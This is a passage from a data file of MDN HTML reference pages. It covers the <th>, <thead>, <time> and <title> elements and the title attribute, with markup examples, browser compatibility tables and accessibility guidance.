([`<td>`](td) elements) are added to each subsequent row.\n\nAs shown in the [usage notes](#usage_notes), the [`colspan`](#colspan) and [`rowspan`](#rowspan) attributes can be used for the `<th>` elements to allocate the header cells to the correct columns and rows. To achieve a \"two-row\" header in the table structure, the first two header cells within the first [`<tr>`](tr) element are spanned across two rows. The third header cell is spanned two columns wide (remaining in the first row). This setup leaves two available areas in the third and fourth columns in the second row, where the two headers within the second [`<tr>`](tr) element are automatically placed, with the default value being `1` for the [`colspan`](#colspan) and [`rowspan`](#rowspan) attributes.\n\n**Note:** Normally, [`<thead>`](thead) and [`<tbody>`](tbody) elements are used to group rows with headers into the respective table head and body sections. This is not implemented in this example to focus on the headers and spanning and reduce the example's complexity.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"col\" rowspan=\"2\">Symbol</th>\n    <th scope=\"col\" rowspan=\"2\">Code word</th>\n    <th scope=\"col\" colspan=\"2\">Pronunciation</th>\n  </tr>\n  <tr>\n    <th scope=\"col\">IPA</th>\n    <th scope=\"col\">Respelling</th>\n  </tr>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>ˈælfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>ˈbraːˈvo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>ˈtʃɑːli</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>ˈdeltɑ</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nThe CSS is unchanged from the [previous example](#basic_column_and_row_headers).\n\n#### Result\n\n### Associate header cells with other header cells\n\nFor more complex relationships between header cells, using `th` elements with the [`scope`](#scope) attribute alone may not be sufficient for assistive technologies, especially screen readers.\n\n#### HTML\n\nTo improve the [accessibility](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility) of the [previous example](#column_and_row_spanning) and to allow screen readers, for example, to speak the headers associated with each header cell, the [`headers`](#headers) attribute can be introduced along with [`id`](../global_attributes/id) attributes. Because of the way the \"Pronunciation\" column is split into two columns in the example, introducing a \"two row\" header, assistive technologies such as screen readers may not be able to identify which additional header cells (`th` elements) the \"Pronunciation\" header cell is related to and vice versa. Therefore, the [`headers`](#headers) attribute is used on the \"Pronunciation\", \"IPA\", and \"Respelling\" header cells to associate the related header cells based on the values of the unique identifiers from the added [`id`](../global_attributes/id) attributes in the form of a space-separated list.\n\n**Note:** It's recommended to use more descriptive and useful values for the [`id`](../global_attributes/id) attribute. Each `id` in a document must be unique to that document. In this example, the `id` values are single characters to maintain focus on the concept of the [`headers`](#headers) attribute.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"col\" rowspan=\"2\">Symbol</th>\n    <th scope=\"col\" rowspan=\"2\">Code word</th>\n    <th scope=\"col\" colspan=\"2\" id=\"p\" headers=\"i r\">Pronunciation</th>\n  </tr>\n  <tr>\n    <th scope=\"col\" id=\"i\" headers=\"p\">IPA</th>\n    <th scope=\"col\" id=\"r\" headers=\"p\">Respelling</th>\n  </tr>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>ˈælfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>ˈbraːˈvo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>ˈtʃɑːli</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>ˈdeltɑ</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### Result\n\nThe [visual result](#result_2) is unchanged from the [previous example table](#column_and_row_spanning).\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `th`      | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `abbr`    | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `axis`    | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `bgcolor` | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `colspan` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `headers` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `rowspan` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `scope`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `width`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each header cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of header cells\n- [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height): CSS property to control the recommended header cell height\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each header cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each header cell content\n- [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): CSS property to control the recommended header cell width\n- [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type): CSS pseudo-classes to select the desired header cells\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/th](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/th)"
- name: thead
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<thead\\>: The Table Head element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fthead&level=high)\n\nThe `<thead>` [HTML](../index) element encapsulates a set of table rows ([`<tr>`](tr) elements), indicating that they comprise the head of a table with information about the table's columns. This is usually in the form of column headers ([`<th>`](th) elements).\n\n## Try it\n\n#### HTML Demo: \\<thead\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Council budget (in £) 2018\n      </caption>\n      <thead>\n        <tr>\n          <th scope=\"col\">Items</th>\n          <th scope=\"col\">Expenditure</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope=\"row\">Donuts</th>\n          <td>3,000</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Stationery</th>\n          <td>18,000</td>\n        </tr>\n      </tbody>\n      <tfoot>\n        <tr>\n          <th scope=\"row\">Totals</th>\n          <td>21,000</td>\n        </tr>\n      </tfoot>\n    </table>\n\n    thead,\n    tfoot {\n      background-color: #2c5e77;\n      color: #fff;\n    }\n\n    tbody {\n      background-color: #e4f0f5;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    td {\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each head cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and the offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each head cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of each head cell. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the head cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each head cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<thead>` is placed after any [`<caption>`](caption) and [`<colgroup>`](colgroup) elements, but before any [`<tbody>`](tbody), [`<tfoot>`](tfoot), and [`<tr>`](tr) elements.\n- Along with its related [`<tbody>`](tbody) and [`<tfoot>`](tfoot) elements, the `<thead>` element provides useful [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) information and can be used when rendering for either screen or print. Specifying such table content groups also provides valuable contextual information for assistive technologies, including screen readers and search engines.\n- When printing a document, in the case of a multipage table, the table head usually specifies information that remains the same on each page.\n\n## Examples\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Basic head structure\n\nThis example demonstrates a table divided into a head section with column headers and a body section with the table's main data.\n\n#### HTML\n\nThe `<thead>` and [`<tbody>`](tbody) elements are used to structure the table rows into [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) sections. The `<thead>` element represents the head section of the table, which contains a row ([`<tr>`](tr)) of column headers cells ([`<th>`](th)).\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th>Student ID</th>\n      <th>Name</th>\n      <th>Major</th>\n      <th>Credits</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>3741255</td>\n      <td>Jones, Martha</td>\n      <td>Computer Science</td>\n      <td>240</td>\n    </tr>\n    <tr>\n      <td>3971244</td>\n      <td>Nim, Victor</td>\n      <td>Russian Literature</td>\n      <td>220</td>\n    </tr>\n    <tr>\n      <td>4100332</td>\n      <td>Petrov, Alexandra</td>\n      <td>Astrophysics</td>\n      <td>260</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### CSS\n\nSome basic CSS is used to style and highlight the table head so that the headings of the columns stand out from the data in the table body.\n\ncss\n\n```\nthead {\n  border-bottom: 2px solid rgb(160 160 160);\n  text-align: center;\n  background-color: #2c5e77;\n  color: #fff;\n}\n\ntbody {\n  background-color: #e4f0f5;\n}\n```\n\n#### Result\n\n### Multiple head rows\n\nThis example demonstrates a table head section with two rows.\n\n#### HTML\n\nWe extend the markup the table from the [basic example](#basic_head_structure) in this example by including two table rows ([`<tr>`](tr)) within the `<thead>` element creating a multi-row table head. We included an additional column, splitting the student names into first and last names.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th rowspan=\"2\">Student ID</th>\n      <th colspan=\"2\">Student</th>\n      <th rowspan=\"2\">Major</th>\n      <th rowspan=\"2\">Credits</th>\n    </tr>\n    <tr>\n      <th>First name</th>\n      <th>Last name</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>3741255</td>\n      <td>Martha</td>\n      <td>Jones</td>\n      <td>Computer Science</td>\n      <td>240</td>\n    </tr>\n    <tr>\n      <td>3971244</td>\n      <td>Victor</td>\n      <td>Nim</td>\n      <td>Russian Literature</td>\n      <td>220</td>\n    </tr>\n    <tr>\n      <td>4100332</td>\n      <td>Alexandra</td>\n      <td>Petrov</td>\n      <td>Astrophysics</td>\n      <td>260</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### Cell spanning\n\nIn order to associate and line up the header cells with the correct columns and rows, the [`colspan`](th#colspan) and [`rowspan`](th#rowspan) attributes are used on the [`<th>`](th) elements. The values set in these attributes specify how many cells each header cell ([`<th>`](th)) spans. Due to the way these attributes are set, the two second-row header cells are lined up with the columns they head. These each span one row and one column as the default values for the [`colspan`](th#colspan) and [`rowspan`](th#rowspan) attributes are both `1`.\n\nThe column and row spanning demonstrated by this example are illustrated in the following figure:\n\n#### CSS\n\nThe CSS is unchanged from the [previous example](#basic_head_structure).\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                            |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                                                                      |\n| Permitted content                           | Zero or more [`<tr>`](tr) elements.                                                                                                                                                                                                        |\n| Tag omission                                | The start tag is mandatory. The end tag may be omitted if the `<thead>` element is immediately followed by a [`<tbody>`](tbody) or [`<tfoot>`](tfoot) element.                                                                             |\n| Permitted parents                           | A [`<table>`](table) element. The `<thead>` must appear after any [`<caption>`](caption) and [`<colgroup>`](colgroup) elements, even implicitly defined, but before any [`<tbody>`](tbody), [`<tfoot>`](tfoot), and [`<tr>`](tr) elements. |\n| Implicit ARIA role                          | [`rowgroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/rowgroup_role)                                                                                                                                          |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                        |\n| DOM interface                               | [`HTMLTableSectionElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTableSectionElement)                                                                                                                                      |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each head cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of head cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each head cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each head cell content\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/thead](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/thead)"
- name: time
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<time\\>: The (Date) Time element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since October 2017.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftime&level=high)\n\nThe `<time>` [HTML](../index) element represents a specific period in time. It may include the `datetime` attribute to translate dates into machine-readable format, allowing for better search engine results or custom features such as reminders.\n\nIt may represent one of the following:\n\n- A time on a 24-hour clock.\n- A precise date in the [Gregorian calendar](https://en.wikipedia.org/wiki/Gregorian_calendar) (with optional time and timezone information).\n- [A valid time duration](https://html.spec.whatwg.org/multipage/common-microsyntaxes.html#valid-duration-string).\n\n## Try it\n\n#### HTML Demo: \\<time\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      The Cure will be celebrating their 40th anniversary on <time datetime=\"2018-07-07\">July 7</time> in London's Hyde\n      Park.\n    </p>\n\n    <p>\n      The concert starts at <time datetime=\"20:00\">20:00</time> and you'll be able to enjoy the band for at least\n      <time datetime=\"PT2H30M\">2h 30m</time>.\n    </p>\n\n    time {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`datetime`](#datetime)  \nThis attribute indicates the time and/or date of the element and must be in one of the formats described below.\n\n## Usage notes\n\nThis element is for presenting dates and times in a machine-readable format. For example, this can help a user agent offer to add an event to a user's calendar.\n\nThis element should not be used for dates prior to the introduction of the Gregorian calendar (due to complications in calculating those dates).\n\nThe *datetime value* (the machine-readable value of the datetime) is the value of the element's `datetime` attribute, which must be in the proper format (see below). If the element does not have a `datetime` attribute, **it must not have any element descendants**, and the *datetime value* is the element's child text content.\n\n### Valid datetime values\n\n[TABLE]\n\n## Examples\n\n### Simple example\n\n#### HTML\n\nhtml\n\n```\n<p>The concert starts at <time datetime=\"2018-07-07T20:00:00\">20:00</time>.</p>\n```\n\n#### Result\n\n### `datetime` example\n\n#### HTML\n\nhtml\n\n```\n<p>\n  The concert took place on <time datetime=\"2001-05-15T19:00\">May 15</time>.\n</p>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                         |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.       |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                             |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                   |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                    |\n| Implicit ARIA role                          | [`time`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                     |\n| DOM interface                               | [`HTMLTimeElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTimeElement)                                                   |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |           |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-----------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera     | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `time`     | 62      | 14   | 22      | 4911.5–12 | 7      | 62             | 22                  | 4611.5–12     | 4             | 8.0              | 62              |     |\n| `datetime` | 62      | 14   | 22      | 4911.5–12 | 7      | 62             | 22                  | 4611.5–12     | 4             | 8.0              | 62              |     |\n\n## See also\n\n- The [`<data>`](data) element, allowing to signal other kind of values.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/time](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/time)"
- name: title
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<title\\>: The Document Title element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftitle&level=high)\n\nThe `<title>` [HTML](../index) element defines the document's title that is shown in a [browser](https://developer.mozilla.org/en-US/docs/Glossary/Browser)'s title bar or a page's tab. It only contains text; tags within the element are ignored.\n\nhtml\n\n```\n<title>Grandma's Heavy Metal Festival Journal</title>\n```\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<title>` element is always used within a page's [`<head>`](head) block.\n\n### Page titles and SEO\n\nThe contents of a page title can have significant implications for search engine optimization ([SEO](https://developer.mozilla.org/en-US/docs/Glossary/SEO)). In general, a longer, descriptive title performs better than short or generic titles. The content of the title is one of the components used by search engine algorithms to decide the order in which to list pages in search results. Also, the title is the initial \"hook\" by which you grab the attention of readers glancing at the search results page.\n\nA few guidelines and tips for composing good titles:\n\n- Avoid one- or two-word titles. Use a descriptive phrase, or a term-definition pairing for glossary or reference-style pages.\n- Search engines typically display about the first 55–60 characters of a page title. Text beyond that may be lost, so try not to have titles longer than that. If you must use a longer title, make sure the important parts come earlier and that nothing critical is in the part of the title that is likely to be dropped.\n- Don't use \"keyword blobs.\" If your title is just a list of words, algorithms often reduce your page's position in the search results.\n- Try to make sure your titles are as unique as possible within your own site. Duplicate—or near-duplicate—titles can contribute to inaccurate search results.\n\n## Accessibility\n\nIt is important to provide an accurate and concise title to describe the page's purpose.\n\nA common navigation technique for users of assistive technology is to read the page title and infer the content the page contains. This is because navigating into a page to determine its content can be a time-consuming and potentially confusing process. Titles should be unique to every page of a website, ideally surfacing the primary purpose of the page first, followed by the name of the website. Following this pattern will help ensure that the primary purpose of the page is announced by a screen reader first. This provides a far better experience than having to listen to the name of a website before the unique page title, for every page a user navigates to in the same website.\n\n### Examples\n\nhtml\n\n```\n<title>Menu - Blue House Chinese Food - FoodYum: Online takeout today!</title>\n```\n\nIf a form submission contains errors and the submission re-renders the current page, the title can be used to help make users aware of any errors with their submission. For instance, update the page `title` value to reflect significant page state changes (such as form validation problems).\n\nhtml\n\n```\n<title>\n  2 errors - Your order - Sea Food Store - Food: Online takeout today!\n</title>\n```\n\n**Note:** Presently, dynamically updating a page's title will not be automatically announced by screen readers. If you are going to update the page title to reflect significant changes to a page's state, then the use of [ARIA Live Regions](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Live_Regions) may be necessary, as well.\n\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.2 \\| W3C Understanding WCAG 2.1](https://www.w3.org/WAI/WCAG21/Understanding/page-titled.html)\n\n## Examples\n\nhtml\n\n```\n<title>Awesome interesting stuff</title>\n```\n\nThis example establishes a page whose title (as displayed at the top of the window or in the window's tab) as \"Awesome interesting stuff\".\n\n## Technical summary\n\n|                                             |                                                                                                                                       |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Metadata content](../content_categories#metadata_content).                                                                           |\n| Permitted content                           | Text that is not inter-element [whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace).                            |\n| Tag omission                                | Both opening and closing tags are required. Note that leaving off `</title>` should cause the browser to ignore the rest of the page. |\n| Permitted parents                           | A [`<head>`](head) element that contains no other `<title>` element.                                                                  |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                   |\n| Permitted ARIA roles                        | No `role` permitted.                                                                                                                  |\n| DOM interface                               | [`HTMLTitleElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTitleElement)                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `title` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- SVG [`<title>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/title) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/title](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/title)"
- name: title (attribute)
  summary: The title global attribute contains text representing advisory information related to the element it belongs to
  description: "# title\n\nThe `title` [global attribute](../global_attributes) contains text representing advisory information related to the element it belongs to.\n\n## Try it\n\n#### HTML Demo: title\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      Use the <code>title</code> attribute on an <code>iframe</code> to clearly identify the content of the\n      <code>iframe</code> to screen readers.\n    </p>\n\n    <iframe title=\"Wikipedia page for the HTML language\" src=\"https://en.m.wikipedia.org/wiki/HTML\"></iframe>\n    <iframe title=\"Wikipedia page for the CSS language\" src=\"https://en.m.wikipedia.org/wiki/CSS\"></iframe>\n\n    iframe {\n      height: 200px;\n      margin-bottom: 24px;\n      width: 100%;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe main use of the `title` attribute is to label [`<iframe>`](../element/iframe) elements for assistive technology.\n\nThe `title` attribute may also be used to label controls in [data tables](../element/table).\n\nThe `title` attribute, when added to [`<link rel=\"stylesheet\">`](../element/link), creates an alternate stylesheet. When defining an alternative style sheet with `<link rel=\"alternate\">` the attribute is required and must be set to a non-empty string.\n\nIf included on the [`<abbr>`](../element/abbr) opening tag, the `title` must be a full expansion of the abbreviation or acronym. Instead of using `title`, when possible, provide an expansion of the abbreviation or acronym in plain text on first use, using the `<abbr>` to mark up the abbreviation. This enables all users know what name or term the abbreviation or acronym shortens while providing a hint to user agents on how to announce the content.\n\nWhile `title` can be used to provide a programmatically associated label for an [`<input>`](../element/input) element, this is not good practice. Use a [`<label>`](../element/label) instead.\n\n## Multiline titles\n\nThe `title` attribute may contain several lines. Each `U+000A LINE FEED` (`LF`) character represents a line break. Some caution must be taken, as this means the following renders across two lines:\n\n### HTML\n\nhtml\n\n```\n<p>\n  Newlines in <code>title</code> should be taken into account. This\n  <span\n    title=\"This is a\nmultiline title\">\n    example span\n  </span>\n  has a title a attribute with a newline.\n</p>\n<hr />\n<pre id=\"output\"></pre>\n```\n\n### JavaScript\n\nWe can query the `title` attribute and display it in the empty `<pre>` element as follows:\n\njs\n\n```\nconst span = document.querySelector(\"span\");\nconst output = document.querySelector(\"#output\");\noutput.textContent = span.title;\n```\n\n### Result\n\n## Title attribute inheritance\n\nIf an element has no `title` attribute, then it inherits it from its parent node, which in turn may inherit it from its parent, and so on.\n\nIf this attribute is set to the empty string, it means its ancestors' `title`s are irrelevant and shouldn't be used in the tooltip for this element.\n\n### HTML\n\nhtml\n\n```\n<div title=\"CoolTip\">\n  <p>Hovering here will show \"CoolTip\".</p>\n  <p title=\"\">Hovering here will show nothing.</p>\n</div>\n```\n\n### Result\n\n## Accessibility concerns\n\nUse of the `title` attribute is highly problematic for:\n\n- People using touch-only devices\n- People navigating with keyboards\n- People navigating with assistive technology such as screen readers or magnifiers\n- People experiencing fine motor control impairment\n- People with cognitive concerns\n\nThis is due to inconsistent browser support, compounded by the additional assistive technology parsing of the browser-rendered page. If a tooltip effect is desired, it is better to [use a more accessible technique](https://inclusive-components.design/tooltips-toggletips/) that can be accessed with the above browsing methods.\n\n- [3.2.5.1. The title attribute \\| W3C HTML 5.2: 3. Semantics, structure, and APIs of HTML documents](https://html.spec.whatwg.org/multipage/dom.html#the-title-attribute)\n- [Using the HTML title attribute – 